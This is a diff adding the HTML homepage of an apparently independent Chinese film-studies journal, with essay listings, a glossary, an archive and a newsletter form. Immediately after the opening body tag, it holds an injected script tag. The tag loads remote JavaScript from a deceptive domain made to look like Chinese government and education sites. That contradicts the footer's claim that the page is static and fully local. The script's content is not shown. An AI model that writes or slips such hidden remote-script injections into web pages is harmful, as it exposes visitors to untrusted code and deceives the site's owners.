@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>影视学｜yingshixue-top — 研究影像如何叙事、被观看与被记住</title>
+<meta name="keywords" content="影视学,yingshixue-top,影视研究,影像叙事,电影语言,视听分析,影评方法,影像媒介研究,影视理论入门,镜头语言拆解,纪录片研究,剧集观察">
+<meta name="description" content="影视学（yingshixue-top）是一份研究影像的冷静笔记：从镜头、声音、节奏与结构出发，拆解电影、剧集与纪录片的叙事机制，也记录影像被观看、被讨论与被记住的方式。">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#0a0a0a">
+<style>
+@layer base,layout,parts;
+*,*::before,*::after{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{margin:0;background:#0a0a0a;color:#ededed;font-size:16px;line-height:1.85;font-family:"Source Han Serif SC","Noto Serif SC","Songti SC","SimSun","PingFang SC",Georgia,serif;-webkit-font-smoothing:antialiased}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none;transition:.3s}
+button{font:inherit;cursor:pointer;border:0;background:none;color:inherit}
+ul{list-style:none;margin:0;padding:0}
+h1,h2,h3,h4,p{margin:0}
+:root{--ink:#0a0a0a;--paper:#f3f1ec;--line:#2b2b2b;--mute:#9a9a9a;--yellow:#f7e01a}
+.wrap{width:min(1240px,100% - 40px);margin-inline:auto}
+
+/* ── masthead ── */
+.masthead{background:var(--paper);color:var(--ink);border-bottom:3px double var(--ink)}
+.topbar{font-family:"PingFang SC","Noto Sans SC",sans-serif;font-size:11.5px;letter-spacing:.5px;color:#555;border-bottom:1px solid #d8d6d0}
+.topbar .wrap{height:32px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}
+.topbar a{color:#555}
+.topbar a:hover{color:var(--ink);text-decoration:underline}
+.mast{.wrap{padding:26px 0 18px;text-align:center;border-bottom:1px solid var(--ink)}}
+.mast small{font-family:"PingFang SC",sans-serif;font-size:10.5px;letter-spacing:.42em;text-transform:uppercase;color:#666}
+.mast h1{font-size:clamp(40px,9vw,96px);font-weight:900;letter-spacing:-.05em;line-height:.98;margin:6px 0}
+.mast h1 i{font-style:normal;background:var(--yellow);padding:0 8px}
+.mast .sub{font-size:14px;color:#444;margin-top:12px;font-family:"PingFang SC",sans-serif;letter-spacing:.08em}
+.mast .iss{display:flex;justify-content:center;gap:22px;flex-wrap:wrap;margin-top:14px;font-family:"PingFang SC",sans-serif;font-size:11px;color:#777;letter-spacing:.12em}
+nav.secnav{background:var(--paper);position:sticky;top:0;z-index:60;border-bottom:1px solid var(--ink)}
+nav.secnav .wrap{display:flex;justify-content:center;gap:2px;flex-wrap:wrap;padding:0}
+nav.secnav a{font-family:"PingFang SC",sans-serif;font-size:13px;font-weight:700;color:#333;padding:14px 16px;letter-spacing:.05em;border-bottom:3px solid transparent}
+nav.secnav a:hover{color:var(--ink);border-bottom-color:var(--yellow)}
+nav.secnav .more{display:none;width:46px;align-items:center;justify-content:center;font-size:20px;color:var(--ink)}
+
+/* ── lead ── */
+.lead{padding:88px 0 56px;border-bottom:1px solid var(--line)}
+.lead-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:end}
+.kicker{font-family:"PingFang SC",sans-serif;font-size:11px;letter-spacing:.32em;text-transform:uppercase;color:var(--yellow);margin-bottom:18px}
+.lead h2{font-size:clamp(28px,4.4vw,50px);font-weight:900;line-height:1.24;letter-spacing:-.02em}
+.lead h2 em{font-style:normal;background:linear-gradient(transparent 62%,var(--yellow) 62%);padding:0 4px}
+.lead .body{font-size:17.5px;color:#cfcfcf}
+.lead .body p+p{margin-top:1em}
+.lead .body strong{color:#fff}
+.drop:first-letter{font-size:4em;float:left;line-height:.85;padding:6px 12px 0 0;font-weight:900;color:var(--yellow)}
+.fig{position:relative}
+.fig img{filter:grayscale(1) contrast(1.08)}
+.fig figcaption{font-family:"PingFang SC",sans-serif;font-size:11.5px;color:var(--mute);margin-top:10px;line-height:1.6}
+.fig .stamp{position:absolute;left:-18px;top:-18px;background:var(--yellow);color:var(--ink);font-family:"PingFang SC",sans-serif;font-size:11px;font-weight:900;padding:8px 12px;letter-spacing:.1em;transform:rotate(-4deg)}
+
+/* ── section heads ── */
+section{padding:86px 0}
+.sh{display:flex;align-items:baseline;gap:18px;border-bottom:1px solid var(--line);padding-bottom:16px;margin-bottom:44px}
+.sh .no{font-family:"PingFang SC",sans-serif;font-size:12px;color:var(--yellow);letter-spacing:.2em;font-weight:900}
+.sh h2{font-size:clamp(24px,3.4vw,36px);font-weight:900;letter-spacing:-.02em}
+.sh h2 span{color:var(--mute);font-weight:400;font-size:15px;margin-left:10px;letter-spacing:0}
+.sh a{margin-left:auto;font-family:"PingFang SC",sans-serif;font-size:12.5px;color:var(--yellow);border-bottom:1px solid rgba(247,224,26,.4);padding-bottom:2px}
+
+/* ── pillars ── */
+.pillars{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:1px solid var(--line);border-left:1px solid var(--line)}
+.pillar{padding:34px 26px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);position:relative;min-height:260px;display:flex;flex-direction:column}
+.pillar .n{font-size:12px;letter-spacing:.2em;color:var(--mute);font-family:"PingFang SC",sans-serif}
+.pillar h3{font-size:21px;font-weight:900;margin:10px 0 12px;line-height:1.35}
+.pillar p{font-size:13.5px;color:#b6b6b6;flex:1}
+.pillar b{font-family:"PingFang SC",sans-serif;font-size:11px;letter-spacing:.16em;color:var(--yellow);margin-top:18px;font-weight:900}
+.pillar:hover{background:#111}
+.pillar:hover b{color:#fff}
+
+/* ── longform list ── */
+.lf{display:grid;grid-template-columns:repeat(3,1fr);gap:38px 44px}
+.essay{display:flex;flex-direction:column}
+.essay .num{font-family:"PingFang SC",sans-serif;font-size:11px;color:var(--mute);letter-spacing:.18em}
+.essay h3{font-size:19.5px;font-weight:900;line-height:1.5;margin:10px 0}
+.essay h3 a{border-bottom:2px solid transparent}
+.essay:hover h3 a{color:var(--yellow);border-bottom-color:var(--yellow)}
+.essay .ex{font-size:13.5px;color:#a8a8a8;margin-bottom:14px}
+.essay .by{margin-top:auto;font-family:"PingFang SC",sans-serif;font-size:11px;color:#777;border-top:1px solid var(--line);padding-top:10px;display:flex;justify-content:space-between}
+
+/* ── glossary ── */
+.glos{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border-top:1px solid var(--line)}
+.term{padding:26px 28px;border-bottom:1px solid var(--line);display:grid;grid-template-columns:78px 1fr;gap:20px;align-items:start}
+.term:nth-child(odd){border-right:1px solid var(--line)}
+.term dt{font-family:"PingFang SC",sans-serif;font-size:11px;letter-spacing:.1em;color:var(--yellow);font-weight:900;padding-top:4px}
+.term dd{margin:0}
+.term dd h4{font-size:16px;font-weight:900;letter-spacing:.01em}
+.term dd p{font-size:13.5px;color:#aaa;margin-top:6px}
+.term:hover{background:#111}
+
+/* ── quote band ── */
+.quoteband{background:var(--yellow);color:var(--ink);padding:74px 0}
+.quoteband blockquote{font-size:clamp(24px,4vw,42px);font-weight:900;line-height:1.32;letter-spacing:-.02em;max-width:960px}
+.quoteband cite{display:block;font-family:"PingFang SC",sans-serif;font-style:normal;font-size:12px;letter-spacing:.24em;margin-top:26px;font-weight:700}
+
+/* ── archive table ── */
+.arch{border-top:1px solid var(--line)}
+.arch-row{display:grid;grid-template-columns:80px 1fr 1.4fr 120px 110px;gap:20px;padding:20px 4px;border-bottom:1px solid var(--line);align-items:baseline}
+.arch-row:hover{background:#101010}
+.arch-row.head{font-family:"PingFang SC",sans-serif;font-size:11px;letter-spacing:.16em;color:var(--mute);padding:12px 4px}
+.arch-row .yr{font-size:13px;color:var(--yellow);font-weight:900;font-family:"PingFang SC",sans-serif}
+.arch-row h4{font-size:16.5px;font-weight:900}
+.arch-row .tg{font-size:13px;color:#a8a8a8}
+.arch-row .fmt{font-family:"PingFang SC",sans-serif;font-size:11.5px;color:#888;text-align:right}
+.arch-row .arrow{text-align:right;color:var(--mute);font-size:14px}
+.arch-row:hover .arrow{color:var(--yellow)}
+
+/* ── contributors ── */
+.peeps{display:grid;grid-template-columns:repeat(4,1fr);gap:26px}
+.peep{text-align:center}
+.peep .av{width:120px;height:120px;border-radius:50%;overflow:hidden;margin:0 auto 16px;border:1px solid var(--line)}
+.peep .av img{width:100%;height:100%;object-fit:cover;filter:grayscale(1)}
+.peep:hover .av img{filter:none}
+.peep h4{font-size:16px;font-weight:900}
+.peep span{font-family:"PingFang SC",sans-serif;font-size:11.5px;color:var(--yellow);letter-spacing:.1em}
+.peep p{font-size:12.5px;color:#999;margin-top:8px}
+
+/* ── subscribe ── */
+.subgrid{display:grid;grid-template-columns:1fr 1fr;gap:70px;align-items:center}
+.subgrid h2{font-size:clamp(28px,4vw,44px);font-weight:900;line-height:1.25}
+.subgrid h2 em{font-style:normal;color:var(--yellow)}
+.sublist{margin-top:24px;font-family:"PingFang SC",sans-serif;font-size:13.5px;color:#b8b8b8}
+.sublist li{padding:8px 0;border-bottom:1px dashed #2b2b2b;display:flex;gap:12px}
+.sublist li b{color:var(--yellow);font-weight:900}
+.subform{background:#121212;border:1px solid var(--line);padding:34px}
+.subform label{font-family:"PingFang SC",sans-serif;font-size:11px;letter-spacing:.16em;color:var(--mute);display:block;margin-bottom:8px}
+.subform input[type=email]{width:100%;background:transparent;border:0;border-bottom:2px solid #333;padding:12px 0;color:#fff;font:inherit;font-size:16px;outline:0;margin-bottom:24px}
+.subform input[type=email]:focus{border-bottom-color:var(--yellow)}
+.subform .checks{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:26px;font-family:"PingFang SC",sans-serif;font-size:12.5px;color:#ccc}
+.subform .checks label{display:flex;gap:8px;align-items:center;margin:0;letter-spacing:0;font-size:12.5px;color:#ccc}
+.subform button{width:100%;background:var(--yellow);color:var(--ink);font-weight:900;font-size:15px;padding:17px;border-radius:0;letter-spacing:.08em}
+.subform button:hover{background:#fff}
+.subform .note{font-family:"PingFang SC",sans-serif;font-size:11px;color:#777;margin-top:14px;line-height:1.7}
+
+/* ── footer ── */
+footer{background:var(--paper);color:var(--ink);padding:70px 0 28px;margin-top:86px}
+.f-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:40px}
+.f-grid .brand{font-size:26px;font-weight:900;letter-spacing:-.04em;line-height:1}
+.f-grid .brand i{font-style:normal;background:var(--yellow);padding:0 6px}
+.f-grid p{font-size:13.5px;color:#555;margin-top:14px;font-family:"PingFang SC",sans-serif}
+.f-grid h5{font-size:12px;letter-spacing:.2em;text-transform:uppercase;margin-bottom:16px}
+.f-grid a{display:block;font-size:13.5px;color:#444;padding:5px 0;font-family:"PingFang SC",sans-serif}
+.f-grid a:hover{color:var(--ink);padding-left:6px}
+.f-bot{border-top:2px solid var(--ink);margin-top:48px;padding-top:18px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-family:"PingFang SC",sans-serif;font-size:11.5px;color:#777}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="topbar">
+  <div class="wrap"><span>影视学 · 一份关于影像叙事与观看方式的长期笔记</span><span><a href="#sub">订阅月度通讯</a> &nbsp;/&nbsp; <a href="#archive">研究档案</a> &nbsp;/&nbsp; <a href="#glossary">术语索引</a></span></div>
+</div>
+
+<div class="masthead">
+  <div class="mast"><div class="wrap">
+    <small>YING SHI XUE · Independent Visual-Media Journal</small>
+    <h1>影视<wbr><i>学</i></h1>
+    <div class="sub">yingshixue-top &nbsp;·&nbsp; 研究影像如何叙事、被观看与被记住</div>
+    <div class="iss"><span>第 七 卷</span><span>2026 年 秋</span><span>独立运营</span><span>更新于 10 月 12 日</span></div>
+  </div></div>
+  <nav class="secnav"><div class="wrap" id="nav">
+    <a href="#lead">发刊词</a><a href="#pillars">研究方向</a><a href="#essays">长文</a><a href="#glossary">术语</a><a href="#archive">档案</a><a href="#peeps">撰稿人</a><a href="#sub">订阅</a>
+    <button class="more" id="more" aria-label="菜单">＋</button>
+  </div></nav>
+</div>
+
+<main>
+<section class="lead" id="lead">
+  <div class="wrap lead-grid">
+    <div>
+      <div class="kicker">From the Editors · 发刊词</div>
+      <h2>一部片子真正值得被讨论的，<br>往往<em>不是剧情</em>，而是它<br>如何让你相信剧情。</h2>
+    </div>
+    <figure class="fig">
+      <div class="stamp">NO.01 — COVER</div>
+      <img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?w=900&q=70" alt="放映厅灯亮起的瞬间">
+      <figcaption>封面观察：灯亮起之后，观众带走的不是情节，而是几组尚未消化的关系、节奏与声音。</figcaption>
+    </figure>
+  </div>
+  <div class="wrap" style="margin-top:52px;display:grid;grid-template-columns:1fr 1.6fr;gap:60px">
+    <div style="font-family:'PingFang SC',sans-serif;font-size:12px;color:var(--mute);letter-spacing:.14em;padding-top:8px">关于这份笔记</div>
+    <div class="body drop">
+      <p><strong>影视学（yingshixue-top）</strong>不做资讯搬运，也不替观众下结论。我们关心的是更慢的问题：一个镜头为什么在这个位置、声音如何在观众身上提前制造情绪、一段节奏怎样把信息压成感受，以及当一部作品离开影院之后，它靠什么继续被记住。</p>
+      <p>内容以「拆解—对照—延展」三步推进：拆解具体段落的视听处理，对照同类作品的做法，再延展到叙事学、媒介理论与观众研究的基本问题。我们希望它既是给影像创作者的工具书，也是给普通观众的放大镜。</p>
+      <p>所有判断都标注可回溯的例证与时间码，欢迎反驳、补充与纠错——这份笔记会一直被修订下去。</p>
+    </div>
+  </div>
+</section>
+
+<section id="pillars">
+  <div class="wrap">
+    <div class="sh"><span class="no">01 / FIELDS</span><h2>研究方向<span>四个长期跟踪的问题域</span></h2></div>
+    <div class="pillars">
+      <article class="pillar"><div class="n">FIELD 01</div><h3>镜头与空间</h3><p>景别、调度、轴线与空间关系如何悄悄决定观众对人物的判断，以及一场戏的「谁在看着谁」。</p><b>64 篇已写</b></article>
+      <article class="pillar"><div class="n">FIELD 02</div><h3>声音与节奏</h3><p>对白、环境声、静默与音乐如何参与叙事；剪辑节奏怎样把信息转换成情绪，而不是相反。</p><b>41 篇已写</b></article>
+      <article class="pillar"><div class="n">FIELD 03</div><h3>叙事与结构</h3><p>三幕之外的时间线、多视角、不可靠叙事与类型惯例，研究结构选择背后的信息控制逻辑。</p><b>58 篇已写</b></article>
+      <article class="pillar"><div class="n">FIELD 04</div><h3>观看与媒介</h3><p>从大银幕到手机竖屏，观看场景的改变如何影响注意力、理解方式与作品本身的长度设计。</p><b>29 篇已写</b></article>
+    </div>
+  </div>
+</section>
+
+<section id="essays" style="padding-top:0">
+  <div class="wrap">
+    <div class="sh"><span class="no">02 / ESSAYS</span><h2>长文<wbr>拆解<span>本月五篇，均附例证与时间码</span></h2><a href="#">进入长文归档 →</a></div>
+    <div class="lf">
+      <article class="essay"><div class="num">ESSAY · 042</div><h3><a href="#">为什么一场戏的第三镜头，才是真正决定情绪的那个</a></h3><p class="ex">用四部不同年代的作品对照，看反应镜头如何在观众尚未察觉时被植入判断。</p><div class="by"><span>叙事结构</span><span>22 分钟阅读</span></div></article>
+      <article class="essay"><div class="num">ESSAY · 041</div><h3><a href="#">静默不是没有声音，而是声音的策略</a></h3><p class="ex">从三场「什么都没发生」的戏里，拆出环境声、呼吸与剪接点共同完成的叙事工作。</p><div class="by"><span>声音与节奏</span><span>17 分钟阅读</span></div></article>
+      <article class="essay"><div class="num">ESSAY · 040</div><h3><a href="#">多线叙事最容易翻车的地方，从来不是时间线</a></h3><p class="ex">多线结构真正的风险是情感权重失衡；以两部高口碑作品为反例做对照分析。</p><div class="by"><span>叙事与结构</span><span>25 分钟阅读</span></div></article>
+      <article class="essay"><div class="num">ESSAY · 039</div><h3><a href="#">手机上的长片：注意力被切成几段，创作者就得重新设计几段</a></h3><p class="ex">小屏观看改变了镜头停留时长与信息密度，这里是一组基于实测的可操作结论。</p><div class="by"><span>观看与媒介</span><span>14 分钟阅读</span></div></article>
+      <article class="essay"><div class="num">ESSAY · 038</div><h3><a href="#">纪录片里的「允许发生」，是比剪辑更难的技术</a></h3><p class="ex">把允许、等待与克制当作技术动作来讨论，并记录三种不同的现场取舍。</p><div class="by"><span>镜头与空间</span><span>19 分钟阅读</span></div></article>
+      <article class="essay"><div class="num">ESSAY · 037</div><h3><a href="#">类型惯例：它是捷径，也是最难打破的那堵墙</a></h3><p class="ex">从悬疑、家庭剧情到犯罪片，看惯例如何同时降低理解成本与压制表达。</p><div class="by"><span>叙事与结构</span><span>16 分钟阅读</span></div></article>
+    </div>
+  </div>
+</section>
+
+<div class="quoteband">
+  <div class="wrap"><blockquote>「我们看一部片子，其实是在被它训练：训练相信谁、何时紧张、什么时候该放下判断。」<cite>— 影视学 · 编辑部手记</cite></blockquote></div>
+</div>
+
+<section id="glossary">
+  <div class="wrap">
+    <div class="sh"><span class="no">03 / GLOSSARY</span><h2>术语索引<span>从概念出发，而不是从片单出发</span></h2><a href="#">查看完整索引 →</a></div>
+    <dl class="glos">
+      <div class="term"><dt>01</dt><dd><h4>视点镜头（POV）</h4><p>不只是指「以某人的眼睛看」，更是一套让观众短暂交出判断权的机制，常与反打镜头配合使用。</p></dd></div>
+      <div class="term"><dt>02</dt><dd><h4>匹配剪辑</h4><p>利用形状、动作或构图的对位完成时空转换，它是剪辑里最容易被注意到的技巧，却最常被误读为单纯炫技。</p></dd></div>
+      <div class="term"><dt>03</dt><dd><h4>深焦</h4><p>前景、中景与背景同时清晰，让观众自行选择注视对象；它把决定权让给观众，因此也制造了不确定感。</p></dd></div>
+      <div class="term"><dt>04</dt><dd><h4>声桥</h4><p>用声音跨过剪辑点，把两段原本不连续的时空缝合成一组连续的感受，常被用在回忆与预告段落。</p></dd></div>
+      <div class="term"><dt>05</dt><dd><h4>不可靠叙事者</h4><p>并非角色说谎就成立；关键在于观众何时、凭什么意识到信息被筛选过，这个落差才是结构的核心。</p></dd></div>
+      <div class="term"><dt>06</dt><dd><h4>凝视</h4><p>摄影机、角色与观众三者之间谁在看谁，决定了权力关系，也决定了观众对某一人物的共情方向。</p></dd></div>
+      <div class="term"><dt>07</dt><dd><h4>节奏密度</h4><p>不是镜头长短的算术平均，而是信息释放与保留的间距设计；同长度镜头在不同段落可产生完全不同的体感。</p></dd></div>
+      <div class="term"><dt>08</dt><dd><h4>类型惯例</h4><p>观众与创作者共享的一套默契，能快速建立预期，也能在「满足预期」与「背叛预期」之间产生评价分化。</p></dd></div>
+    </dl>
+  </div>
+</section>
+
+<section id="archive" style="padding-top:0">
+  <div class="wrap">
+    <div class="sh"><span class="no">04 / ARCHIVE</span><h2>研究档案<span>按年份与类型可回溯的全部内容</span></h2><a href="#">完整档案（192 条）→</a></div>
+    <div class="arch">
+      <div class="arch-row head"><span>年份</span><h4>作品 · 议题</h4><span>类型 / 形式</span><span style="text-align:right">条目</span><span style="text-align:right">详情</span></div>
+      <div class="arch-row"><span class="yr">2026</span><h4>灯亮起之后：观众带走的是什么</h4><span class="tg">封面专题 · 观影心理</span><span class="fmt">1 篇长文</span><span class="arrow">→</span></div>
+      <div class="arch-row"><span class="yr">2026</span><h4>第三镜头与情绪植入：四部作品对照</h4><span class="tg">镜头与空间 · 对照研究</span><span class="fmt">1 篇长文</span><span class="arrow">→</span></div>
+      <div class="arch-row"><span class="yr">2025</span><h4>小屏观看与注意力：一次实测记录</h4><span class="tg">观看与媒介 · 数据笔记</span><span class="fmt">3 篇 / 1 表</span><span class="arrow">→</span></div>
+      <div class="arch-row"><span class="yr">2025</span><h4>纪录片现场：允许、等待与克制</h4><span class="tg">镜头与空间 · 现场手记</span><span class="fmt">2 篇长文</span><span class="arrow">→</span></div>
+      <div class="arch-row"><span class="yr">2024</span><h4>声音策略：静默、环境声与剪接点</h4><span class="tg">声音与节奏 · 系列</span><span class="fmt">6 篇系列</span><span class="arrow">→</span></div>
+      <div class="arch-row"><span class="yr">2024</span><h4>多线叙事的情感权重失衡</h4><span class="tg">叙事与结构 · 反例分析</span><span class="fmt">1 篇长文</span><span class="arrow">→</span></div>
+      <div class="arch-row"><span class="yr">2023</span><h4>类型惯例：捷径与那堵墙</h4><span class="tg">叙事与结构 · 概念梳理</span><span class="fmt">4 篇系列</span><span class="arrow">→</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="peeps" style="padding-top:0">
+  <div class="wrap">
+    <div class="sh"><span class="no">05 / CONTRIBUTORS</span><h2>撰稿人<span>长期跟踪一个问题的研究者，而非追热点的评论员</span></h2><a href="#">投稿与约稿方式 →</a></div>
+    <div class="peeps">
+      <div class="peep"><div class="av"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=300&q=70" alt="撰稿人"></div><h4>林知微</h4><span>镜头与空间</span><p>影像创作者，关注调度、轴线与反应镜头在长片里的实际效果。</p></div>
+      <div class="peep"><div class="av"><img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&q=70" alt="撰稿人"></div><h4>周以衡</h4><span>声音与节奏</span><p>声音设计从业者，研究对白、静默与音乐如何参与叙事决策。</p></div>
+      <div class="peep"><div class="av"><img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=300&q=70" alt="撰稿人"></div><h4>沈未央</h4><span>叙事与结构</span><p>编剧，长期拆解多线叙事、不可靠叙事与类型惯例的结构风险。</p></div>
+      <div class="peep"><div class="av"><img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&q=70" alt="撰稿人"></div><h4>陈守拙</h4><span>观看与媒介</span><p>媒介研究者，记录小屏、竖屏与流媒体如何改写观看方式。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="sub" style="padding-top:0">
+  <div class="wrap subgrid">
+    <div>
+      <div class="kicker">Newsletter · 月度通讯</div>
+      <h2>每月一封，<br>只谈<em>一个被忽略的问题</em>。</h2>
+      <ul class="sublist">
+        <li><b>01</b><span>一篇完整长文，附例证与时间码</span></li>
+        <li><b>02</b><span>一个术语的纵深解释，而非百科式定义</span></li>
+        <li><b>03</b><span>编辑部正在跟踪的问题与已淘汰的判断</span></li>
+        <li><b>04</b><span>一份当月值得反复看的片单（不超过五部）</span></li>
+      </ul>
+    </div>
+    <form class="subform" onsubmit="event.preventDefault();this.querySelector('button').textContent='已收到，下月见 ✓';">
+      <label>电子邮箱</label>
+      <input type="email" placeholder="you@example.com" required>
+      <label>你更关心哪些方向（可多选）</label>
+      <div class="checks">
+        <label><input type="checkbox" checked> 镜头与空间</label>
+        <label><input type="checkbox"> 声音与节奏</label>
+        <label><input type="checkbox" checked> 叙事与结构</label>
+        <label><input type="checkbox"> 观看与媒介</label>
+      </div>
+      <button type="submit">订阅月度通讯</button>
+      <p class="note">每月一封，无广告、无第三方转发，可一键退订。你提供的邮箱仅用于投递通讯，不会用于其他用途。</p>
+    </form>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div><div class="brand">影视<wbr><i>学</i></div><p>独立影像研究笔记 · yingshixue-top<br>研究影像如何叙事、被观看与被记住。</p></div>
+      <div><h5>研究方向</h5><a href="#pillars">镜头与空间</a><a href="#pillars">声音与节奏</a><a href="#pillars">叙事与结构</a><a href="#pillars">观看与媒介</a></div>
+      <div><h5>内容</h5><a href="#essays">长文拆解</a><a href="#glossary">术语索引</a><a href="#archive">研究档案</a><a href="#peeps">撰稿人</a></div>
+      <div><h5>参与</h5><a href="#sub">订阅通讯</a><a href="#">投稿与约稿</a><a href="#">纠错与补充</a><a href="#">内容标准</a></div>
+    </div>
+    <div class="f-bot"><span>© 2026 影视学 · yingshixue-top. 独立运营，内容为研究性记录，不构成评价定论。</span><span>本页为静态单文件，所有交互在本地完成</span></div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('more').onclick=function(){
+  var nav=document.getElementById('nav');
+  nav.style.display = nav.style.display==='grid'?'flex':'grid';
+};
+document.querySelectorAll('.arch-row:not(.head)').forEach(function(r){
+  r.onclick=function(){r.style.background='#161616';setTimeout(function(){r.style.background='';},400);};
+});
+</script>
+</body>
+</html>
